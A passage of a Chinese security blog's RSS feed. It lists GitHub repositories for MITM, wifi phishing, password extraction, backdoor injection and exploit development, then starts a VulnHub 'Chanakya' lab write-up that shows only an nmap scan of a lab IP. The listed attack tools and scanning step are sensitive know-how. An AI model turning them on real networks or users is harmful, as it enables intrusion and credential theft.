&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NpdHJvbm5ldXIvcmRw&#34;&gt;https://github.com/citronneur/rdp&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;中间人攻击框架&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NlY3JldHNxdWlycmVsL3RoZS1iYWNrZG9vci1mYWN0b3J5&#34;&gt;https://github.com/secretsquirrel/the-backdoor-factory&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NlY3JldHNxdWlycmVsL0JERlByb3h5&#34;&gt;https://github.com/secretsquirrel/BDFProxy&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL01JVE1m&#34;&gt;https://github.com/byt3bl33d3r/MITMf&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Inject code, jam wifi, and spy on wifi users&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0Rhbk1jSW5lcm5leS9MQU5zLnB5&#34;&gt;https://github.com/DanMcInerney/LANs.py&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;可扩展的中间人代理工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ludHJlcGlkdXNncm91cC9tYWxsb3J5&#34;&gt;https://github.com/intrepidusgroup/mallory&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;wifi 钓鱼&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NvcGhyb24vd2lmaXBoaXNoZXI=&#34;&gt;https://github.com/sophron/wifiphisher&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;密码破解工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NoaW5ub2svam9obm55&#34;&gt;https://github.com/shinnok/johnny&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;本地存储的各类密码提取利器&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmU=&#34;&gt;https://github.com/AlessandroZ/LaZagne&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;二进制分析工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RldnR0eXMwL2JpbndhbGs=&#34;&gt;https://github.com/devttys0/binwalk&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3F1YXJrc2xhYi9iaW5tYXA=&#34;&gt;https://github.com/quarkslab/binmap&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries.&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzB2ZXJjbDBrL3Jw&#34;&gt;https://github.com/0vercl0k/rp&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Windows Exploit Development 工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpbGx5cGFkL2JhZGdlcg==&#34;&gt;https://github.com/lillypad/badger&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;二进制静态分析工具（Python）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JkY2h0L2Ftb2Nv&#34;&gt;https://github.com/bdcht/amoco&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Python Exploit Development Assistance for GDB&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xvbmdsZC9wZWRh&#34;&gt;https://github.com/longld/peda&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;对 BillGates Linux Botnet 系木马活动的监控工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1ZhbGRpa1NTL2JpbGxnYXRlcy1ib3RuZXQtdHJhY2tlcg==&#34;&gt;https://github.com/ValdikSS/billgates-botnet-tracker&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;木马配置参数提取工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tldnRoZWhlcm1pdC9SQVREZWNvZGVycw==&#34;&gt;https://github.com/kevthehermit/RATDecoders&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Shellphish 编写的二进制分析工具（CTF 向）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FuZ3IvYW5ncg==&#34;&gt;https://github.com/angr/angr&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;针对 python 的静态代码分析工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3lpbndhbmcwL3B5c29uYXIy&#34;&gt;https://github.com/yinwang0/pysonar2&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一个自动化的脚本（shell）分析工具，用来给出警告和建议&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tvYWxhbWFuL3NoZWxsY2hlY2s=&#34;&gt;https://github.com/koalaman/shellcheck&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;基于 AST 变换的简易 JavaScript 反混淆辅助工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NoaUNob3UvZXRhY3N1ZmJv&#34;&gt;https://github.com/ChiChou/etacsufbo&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;二进制 EXP 编写工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3QwMHNoL3JvcC10b29s&#34;&gt;https://github.com/t00sh/rop-tool&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CTF Pwn 类题目脚本编写框架&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0dhbGxvcHNsZWQvcHdudG9vbHM=&#34;&gt;https://github.com/Gallopsled/pwntools&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;an easy-to-use io library for pwning development&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3pUcml4L3ppbw==&#34;&gt;https://github.com/zTrix/zio&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZyaWRhL2ZyaWRh&#34;&gt;https://github.com/frida/frida&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;隐写检测工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FiZWx1Y2svc3RlZ2RldGVjdA==&#34;&gt;https://github.com/abeluck/stegdetect&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;域渗透教程&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2wzbTBuL3BlbnRlc3Rfc3R1ZHk=&#34;&gt;https://github.com/l3m0n/pentest_study&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;python security 教程（原文链接 http://www.primalsecurity.net/tutorials/python-tutorials/）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NtYXJ0Rmxhc2gvcHlTZWN1cml0eQ==&#34;&gt;https://github.com/smartFlash/pySecurity&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;data_hacking 合集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NsaWNrU2VjdXJpdHkvZGF0YV9oYWNraW5n&#34;&gt;https://github.com/ClickSecurity/data_hacking&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;mobile-security-wiki&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2V4cGxvaXRwcm90b2NvbC9tb2JpbGUtc2VjdXJpdHktd2lraQ==&#34;&gt;https://github.com/exploitprotocol/mobile-security-wiki&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;书籍《reverse-engineering-for-beginners》&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ZlZmljb3MvcmV2ZXJzZS1lbmdpbmVlcmluZy1mb3ItYmVnaW5uZXJz&#34;&gt;https://github.com/veficos/reverse-engineering-for-beginners&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一些信息安全标准及设备配置&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2x1eWcyNC9JVF9zZWN1cml0eQ==&#34;&gt;https://github.com/luyg24/IT_security&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;APT 相关笔记&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tiYW5kbGEvQVBUbm90ZXM=&#34;&gt;https://github.com/kbandla/APTnotes&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Kcon 资料&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tub3duc2VjL0tDb24=&#34;&gt;https://github.com/knownsec/KCon&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;ctf及黑客资源合集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ctf及黑客资源合集&#34;&gt;#&lt;/a&gt; ctf 及黑客资源合集&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2J0M2dsL015LUdyYXktSGFja2VyLVJlc291cmNlcw==&#34;&gt;https://github.com/bt3gl/My-Gray-Hacker-Resources&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ctf 和安全工具大合集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3phcmR1cy9jdGYtdG9vbHM=&#34;&gt;https://github.com/zardus/ctf-tools&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;《DO NOT FUCK WITH A HACKER》&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NpdHlwdy9ETkZXQUg=&#34;&gt;https://github.com/citypw/DNFWAH&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;近年 ctf writeup 大全&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N0ZnMvd3JpdGUtdXBzLTIwMTY=&#34;&gt;https://github.com/ctfs/write-ups-2016&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N0ZnMvd3JpdGUtdXBzLTIwMTU=&#34;&gt;https://github.com/ctfs/write-ups-2015&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N0ZnMvd3JpdGUtdXBzLTIwMTQ=&#34;&gt;https://github.com/ctfs/write-ups-2014&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;fbctf 竞赛平台 Demo&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZhY2Vib29rL2ZiY3Rm&#34;&gt;https://github.com/facebook/fbctf&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ctf Resources&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N0ZnMvcmVzb3VyY2Vz&#34;&gt;https://github.com/ctfs/resources&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;大礼包（什么都有）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JheWFuZGluL2F3ZXNvbWUtYXdlc29tZW5lc3M=&#34;&gt;https://github.com/bayandin/awesome-awesomeness&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;bash-handbook&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RlbnlzZG92aGFuL2Jhc2gtaGFuZGJvb2s=&#34;&gt;https://github.com/denysdovhan/bash-handbook&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;python 资源大全&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2pvYmJvbGUvYXdlc29tZS1weXRob24tY24=&#34;&gt;https://github.com/jobbole/awesome-python-cn&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;git 学习资料&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3hpcm9uZy9teS1naXQ=&#34;&gt;https://github.com/xirong/my-git&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;安卓开源代码解析&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FuZHJvaWQtY24vYW5kcm9pZC1vcGVuLXByb2plY3QtYW5hbHlzaXM=&#34;&gt;https://github.com/android-cn/android-open-project-analysis&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;python框架库资源大合集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python框架库资源大合集&#34;&gt;#&lt;/a&gt; python 框架，库，资源大合集&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ZpbnRhL2F3ZXNvbWUtcHl0aG9u&#34;&gt;https://github.com/vinta/awesome-python&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;JS 正则表达式库（用于简化构造复杂的 JS 正则表达式）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1ZlcmJhbEV4cHJlc3Npb25zL0pTVmVyYmFsRXhwcmVzc2lvbnM=&#34;&gt;https://github.com/VerbalExpressions/JSVerbalExpressions&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;python 正则表达式库（用于简化构造复杂的 python 正则表达式）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1ZlcmJhbEV4cHJlc3Npb25zL1B5dGhvblZlcmJhbEV4cHJlc3Npb25z&#34;&gt;https://github.com/VerbalExpressions/PythonVerbalExpressions&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;python 任务管理以及命令执行库&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3B5aW52b2tlL2ludm9rZQ==&#34;&gt;https://github.com/pyinvoke/invoke&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;python exe 打包库&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3B5aW5zdGFsbGVyL3B5aW5zdGFsbGVy&#34;&gt;https://github.com/pyinstaller/pyinstaller&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;py3 爬虫框架&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL29yZi9jeWJvcmc=&#34;&gt;https://github.com/orf/cyborg&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一个提供底层接口数据包编程和网络协议支持的 python 库&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NvcmVTZWN1cml0eS9pbXBhY2tldA==&#34;&gt;https://github.com/CoreSecurity/impacket&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;python requests 库&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tlbm5ldGhyZWl0ei9yZXF1ZXN0cw==&#34;&gt;https://github.com/kennethreitz/requests&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;python 实用工具合集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21haG1vdWQvYm9sdG9ucw==&#34;&gt;https://github.com/mahmoud/boltons&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;python 爬虫系统&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpbnV4L3B5c3BpZGVy&#34;&gt;https://github.com/binux/pyspider&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ctf 向 python 工具包&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1Axa2FjaHUvdjBsdA==&#34;&gt;https://github.com/P1kachu/v0lt&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;科学上网工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1hYLW5ldC9YWC1OZXQ=&#34;&gt;https://github.com/XX-net/XX-Net&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;微信自动抢红包动态库&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Vhc3Q1MjAvQXV0b0dldFJlZEVudg==&#34;&gt;https://github.com/east520/AutoGetRedEnv&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;微信抢红包插件（安卓版）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dlZWVlZWVlZWVrL1dlQ2hhdEx1Y2t5TW9uZXk=&#34;&gt;https://github.com/geeeeeeeeek/WeChatLuckyMoney&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;神器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#神器&#34;&gt;#&lt;/a&gt; 神器&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3lhbmd5YW5nd2l0aGdudS9oYXJkc2VlZA==&#34;&gt;https://github.com/yangyangwithgnu/hardseed&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Rob21hc3BhdHprZS9XQVNF&#34;&gt;https://github.com/thomaspatzke/WASE&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;web 索引及日志搜索工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0tvemVhL3dkYg==&#34;&gt;https://github.com/Kozea/wdb&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一款 CS 结构的 web debuger&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FyYW1vc2YvcmVjb3ZlcnNxbGl0ZS8=&#34;&gt;https://github.com/aramosf/recoversqlite/&lt;/span&gt;&lt;br&gt;
recover information from deleted registers in sqlite databases.&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYS90cGxtYXA=&#34;&gt;https://github.com/epinna/tplmap&lt;/span&gt;&lt;br&gt;
 自动化的模板注入攻击检测工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NsaWVudDkvbGliaW5qZWN0aW9u&#34;&gt;https://github.com/client9/libinjection&lt;/span&gt;&lt;br&gt;
sqli 词法解析分析器&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3p4c2VjdXJpdHkvZ3Bzbml0Y2g=&#34;&gt;https://github.com/zxsecurity/gpsnitch&lt;/span&gt;&lt;br&gt;
gps 欺骗检测工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpZ2dpZXNtYWxsc0FHL25pZ2h0SGF3a1Jlc3BvbnNl&#34;&gt;https://github.com/biggiesmallsAG/nightHawkResponse&lt;/span&gt;&lt;br&gt;
 应急处置响应框架&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0ZhbGxpYmxlSW5jL3NlY3VyaXR5LWd1aWRlLWZvci1kZXZlbG9wZXJz&#34;&gt;https://github.com/FallibleInc/security-guide-for-developers&lt;/span&gt;&lt;br&gt;
web 安全开发指南&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzRpZG8xMG4vd29veXVuLWRyb3BzLWFsbC1hcnRpY2xlcy1wYWNrYWdl&#34;&gt;https://github.com/4ido10n/wooyun-drops-all-articles-package&lt;/span&gt;&lt;br&gt;
 乌云知识库全部文章&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3BhcmFsYXgvYXdlc29tZS1ob25leXBvdHM=&#34;&gt;https://github.com/paralax/awesome-honeypots&lt;/span&gt;&lt;br&gt;
 蜜罐资源合集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3d1ZmVpZmVpL2NvYnJh&#34;&gt;https://github.com/wufeifei/cobra&lt;/span&gt;&lt;br&gt;
 自动化代码审计工具&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0hhdEJveS9QY2FwLUFuYWx5emVy&#34;&gt;https://github.com/HatBoy/Pcap-Analyzer&lt;/span&gt;&lt;br&gt;
python 编写的离线网络数据包分析器&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xlb250ZWFsZS9wZW50ZXN0cGFja2FnZQ==&#34;&gt;https://github.com/leonteale/pentestpackage&lt;/span&gt;&lt;br&gt;
 渗透测试常见小工具打包&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3BoaXRoMG4vTWluZC1NYXA=&#34;&gt;https://github.com/phith0n/Mind-Map&lt;/span&gt;&lt;br&gt;
 安全脑图合集&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvc2VjLWNoYXJ0L3RyZWUvMjk0ZDdjMWZmMWViYTI5N2ZhODkyZGRhMDhmM2MwNWU5MGVkMTQyOA==&#34;&gt;https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428&lt;/span&gt;&lt;br&gt;
 有关信息安全的一些流程图收集&lt;/p&gt;
&lt;p&gt;Awesome List&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NpbmRyZXNvcmh1cy9hd2Vzb21lI3NlY3VyaXR5&#34;&gt;https://github.com/sindresorhus/awesome#security&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Rlc2FzdGVyL2tpcHBv&#34;&gt;https://github.com/desaster/kippo&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;SSH Honeypot&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21pY2hlbG9vc3RlcmhvZi9jb3dyaWU=&#34;&gt;https://github.com/micheloosterhof/cowrie&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;kippo 进阶版&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2F3aGl0ZWhhdHRlci9tYWlsb25leQ==&#34;&gt;https://github.com/awhitehatter/mailoney&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;SMTP honeypot&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL211c2hvcmcvZ2xhc3RvcGY=&#34;&gt;https://github.com/mushorg/glastopf&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Web Application honeypot&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2pvcmRhbi13cmlnaHQvZWxhc3RpY2hvbmV5&#34;&gt;https://github.com/jordan-wright/elastichoney&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;数据库蜜罐&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2F0aWdlcjc3L0Rpb25hZWE=&#34;&gt;https://github.com/atiger77/Dionaea&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Web 蜜罐&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/08/20/Chanakya%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</guid>
            <title>Chanakya靶场笔记</title>
            <link>https://chungod.github.io/2021/08/20/Chanakya%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</link>
            <category>Chanakya靶场笔记</category>
            <pubDate>Fri, 20 Aug 2021 16:31:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;chanakya靶场笔记&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chanakya靶场笔记&#34;&gt;#&lt;/a&gt; Chanakya 靶场笔记&lt;/h2&gt;
&lt;p&gt;靶场下载：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGEtY2hhbmFreWEsMzk1Lw==&#34;&gt;https://www.vulnhub.com/entry/ha-chanakya,395/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h3&gt;
&lt;p&gt;利用 nmap 进行扫描，发现开放了 21，22，80 端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820151737064.png&#34; alt=&#34;image-20210820151737064&#34;&gt;&lt;/p&gt;
&lt;p&gt;进一步扫描&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nmap -n -sV -sC -A 172.16.10.136&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
